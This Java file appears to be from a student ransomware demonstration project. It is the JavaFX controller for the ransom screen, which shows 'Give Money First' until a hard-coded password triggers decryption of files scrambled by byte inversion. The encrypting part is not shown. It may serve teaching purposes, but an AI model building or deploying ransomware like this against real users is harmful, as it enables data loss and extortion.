
package lk.ijse.dep10.malware.controller;

        import javafx.application.Platform;
        import javafx.event.ActionEvent;
        import javafx.fxml.FXML;
        import javafx.scene.control.Button;
        import javafx.scene.control.Label;
        import javafx.scene.control.PasswordField;
        import javafx.scene.control.ProgressBar;

        import java.io.*;
        import java.util.ArrayList;

public class MainSceneController {

    public PasswordField pswDecrypt;
    public Button btnDecrypt;
    public Label lblFinal;
    @FXML
    private ArrayList<File> encryptedFiles = new ArrayList<>();     //
    private final String SIGNATURE = "You are fucked up";


    public void initData(ArrayList<File> encryptedFiles) {
        this.encryptedFiles = encryptedFiles;
        lblFinal.setVisible(false);

    }





    private void fileOperation(File file, FileInputStream fis, File tempFile, FileOutputStream fos) throws IOException {
        while (true) {
            byte[] buffer = new byte[1024];
            int read = fis.read(buffer);
            if(read==-1)break;
            for (int i = 0; i < read; i++) {
                buffer[i] = (byte) ~buffer[i];
            }
            fos.write(buffer, 0, read);
        }
        file.delete();
        tempFile.renameTo(file);
    }



    private boolean isEncrypted(File file) throws IOException {
        byte[] firstBytes = new byte[17];
        byte[] signatureByte = SIGNATURE.getBytes();

        FileInputStream fis = new FileInputStream(file);
        fis.read(firstBytes);

        for (int i = 0; i < 17; i++) {
            if (signatureByte[i] != firstBytes[i]) {

                return false;
            }
        }

        return true;
    }

    public void btnDecryptOnAction(ActionEvent actionEvent) throws IOException {
        if(pswDecrypt.getText().trim().isEmpty())return;
        if(pswDecrypt.getText().equals("IJSE")){
            decryptFiles();
            return;
        }
        pswDecrypt.selectAll();
        pswDecrypt.requestFocus();
        lblFinal.setText("Give Money First");
        lblFinal.setVisible(true);
    }

    public void decryptFiles() throws IOException {
        for (File file : encryptedFiles) {
            if(!(isEncrypted(file)))continue;
            FileInputStream fis = new FileInputStream(file);
            File tempFile = File.createTempFile("-app", "NotOk");

            FileOutputStream fos = new FileOutputStream(tempFile);

            fis.read(SIGNATURE.getBytes());


            fileOperation(file, fis, tempFile, fos);
            lblFinal.setText("All Good....Byee!");
            lblFinal.setVisible(true);


        }

    }
}

